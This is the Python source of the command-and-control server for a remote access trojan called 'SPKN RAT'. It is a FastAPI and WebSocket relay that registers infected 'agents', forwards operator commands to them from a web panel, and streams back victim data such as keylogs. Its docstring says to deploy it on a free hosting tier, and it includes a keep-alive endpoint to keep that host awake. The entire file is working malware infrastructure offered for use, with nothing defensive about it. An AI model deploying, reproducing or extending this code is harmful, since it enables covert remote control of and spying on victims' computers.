"""
SPKN RAT — C2 Server
FastAPI + WebSocket relay between agents and web panel.
Deploy on Render.com free tier (no card needed).
"""

import asyncio
import hashlib
import json
import os
import secrets
import time
import uuid
from datetime import datetime
from typing import Dict, Optional

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Depends, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from starlette.websockets import WebSocketState

# ── Config ──────────────────────────────────────────────────────────────────
PANEL_PASSWORD_HASH = os.environ.get(
    "PANEL_PASSWORD_HASH",
    hashlib.sha256("changeme".encode()).hexdigest()  # default — CHANGE THIS
)
AGENT_AUTH_TOKEN = os.environ.get("AGENT_AUTH_TOKEN", "spkn-agent-secret-token")
SESSION_TTL = 86400  # 24h

# ── App ─────────────────────────────────────────────────────────────────────
app = FastAPI(title="SPKN RAT C2", docs_url=None, redoc_url=None)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── State ───────────────────────────────────────────────────────────────────
agents: Dict[str, dict] = {}          # agent_id -> {ws, info, last_seen}
panel_sessions: Dict[str, dict] = {}  # session_token -> {created}
panel_sockets: Dict[str, WebSocket] = {}  # ws_id -> WebSocket
pending_responses: Dict[str, asyncio.Future] = {}  # req_id -> Future


# ── Auth ────────────────────────────────────────────────────────────────────
@app.post("/api/login")
async def login(request: Request):
    body = await request.json()
    pw = body.get("password", "")
    if hashlib.sha256(pw.encode()).hexdigest() != PANEL_PASSWORD_HASH:
        raise HTTPException(401, "wrong password")
    token = secrets.token_hex(32)
    panel_sessions[token] = {"created": time.time()}
    return {"token": token}


def verify_session(token: str) -> bool:
    sess = panel_sessions.get(token)
    if not sess:
        return False
    if time.time() - sess["created"] > SESSION_TTL:
        del panel_sessions[token]
        return False
    return True


# ── REST endpoints ──────────────────────────────────────────────────────────
@app.get("/api/agents")
async def list_agents(token: str = ""):
    if not verify_session(token):
        raise HTTPException(401, "unauthorized")
    result = []
    for aid, a in agents.items():
        result.append({
            "id": aid,
            "info": a.get("info", {}),
            "last_seen": a.get("last_seen", 0),
            "connected": a["ws"].client_state == WebSocketState.CONNECTED if a.get("ws") else False,
        })
    return result


# ── Agent WebSocket ─────────────────────────────────────────────────────────
@app.websocket("/ws/agent")
async def agent_ws(ws: WebSocket):
    await ws.accept()

    # auth handshake
    try:
        auth_msg = await asyncio.wait_for(ws.receive_json(), timeout=10)
        if auth_msg.get("token") != AGENT_AUTH_TOKEN:
            await ws.close(1008, "bad token")
            return
        agent_id = auth_msg.get("agent_id", str(uuid.uuid4()))
        info = auth_msg.get("info", {})
    except Exception:
        await ws.close(1008, "auth failed")
        return

    agents[agent_id] = {
        "ws": ws,
        "info": info,
        "last_seen": time.time(),
    }
    await broadcast_agents_update()
    print(f"[+] Agent connected: {agent_id} ({info.get('hostname', '?')})")

    try:
        while True:
            data = await ws.receive_json()
            agents[agent_id]["last_seen"] = time.time()

            # response to a command
            req_id = data.get("req_id")
            if req_id and req_id in pending_responses:
                pending_responses[req_id].set_result(data)
            else:
                # unsolicited data (keylog stream, etc.)
                await relay_to_panels({
                    "type": "agent_data",
                    "agent_id": agent_id,
                    "data": data,
                })
    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[-] Agent {agent_id} error: {e}")
    finally:
        agents.pop(agent_id, None)
        await broadcast_agents_update()
        print(f"[-] Agent disconnected: {agent_id}")


# ── Panel WebSocket ─────────────────────────────────────────────────────────
@app.websocket("/ws/panel")
async def panel_ws(ws: WebSocket):
    await ws.accept()

    # auth
    try:
        auth_msg = await asyncio.wait_for(ws.receive_json(), timeout=10)
        if not verify_session(auth_msg.get("token", "")):
            await ws.close(1008, "unauthorized")
            return
    except Exception:
        await ws.close(1008, "auth failed")
        return

    ws_id = str(uuid.uuid4())
    panel_sockets[ws_id] = ws
    print(f"[+] Panel connected: {ws_id}")

    # send current agents list
    await ws.send_json({
        "type": "agents_list",
        "agents": build_agents_list(),
    })

    try:
        while True:
            msg = await ws.receive_json()
            action = msg.get("action")
            agent_id = msg.get("agent_id")

            if action == "command" and agent_id in agents:
                req_id = str(uuid.uuid4())
                cmd = msg.get("command", {})
                cmd["req_id"] = req_id

                # create future for response
                future = asyncio.get_event_loop().create_future()
                pending_responses[req_id] = future

                try:
                    await agents[agent_id]["ws"].send_json(cmd)
                    # wait for response with timeout
                    timeout = msg.get("timeout", 30)
                    result = await asyncio.wait_for(future, timeout=timeout)
                    await ws.send_json({
                        "type": "command_response",
                        "agent_id": agent_id,
                        "req_id": req_id,
                        "data": result,
                    })
                except asyncio.TimeoutError:
                    await ws.send_json({
                        "type": "command_response",
                        "agent_id": agent_id,
                        "req_id": req_id,
                        "data": {"status": "error", "error": "timeout"},
                    })
                except Exception as e:
                    await ws.send_json({
                        "type": "command_response",
                        "agent_id": agent_id,
                        "req_id": req_id,
                        "data": {"status": "error", "error": str(e)},
                    })
                finally:
                    pending_responses.pop(req_id, None)

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[-] Panel {ws_id} error: {e}")
    finally:
        panel_sockets.pop(ws_id, None)
        print(f"[-] Panel disconnected: {ws_id}")


# ── Helpers ─────────────────────────────────────────────────────────────────
def build_agents_list():
    result = []
    for aid, a in agents.items():
        result.append({
            "id": aid,
            "info": a.get("info", {}),
            "last_seen": a.get("last_seen", 0),
            "connected": a["ws"].client_state == WebSocketState.CONNECTED if a.get("ws") else False,
        })
    return result


async def broadcast_agents_update():
    msg = {"type": "agents_list", "agents": build_agents_list()}
    dead = []
    for ws_id, ws in panel_sockets.items():
        try:
            await ws.send_json(msg)
        except Exception:
            dead.append(ws_id)
    for ws_id in dead:
        panel_sockets.pop(ws_id, None)


async def relay_to_panels(msg: dict):
    dead = []
    for ws_id, ws in panel_sockets.items():
        try:
            await ws.send_json(msg)
        except Exception:
            dead.append(ws_id)
    for ws_id in dead:
        panel_sockets.pop(ws_id, None)


# ── Keep-alive endpoint (prevents Render free tier sleep) ──────────────────
@app.get("/ping")
async def ping():
    return {"status": "alive", "agents": len(agents), "ts": time.time()}


# ── Serve static panel ─────────────────────────────────────────────────────
app.mount("/", StaticFiles(directory="static", html=True), name="static")


# ── Run ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8443))
    uvicorn.run(app, host="0.0.0.0", port=port)
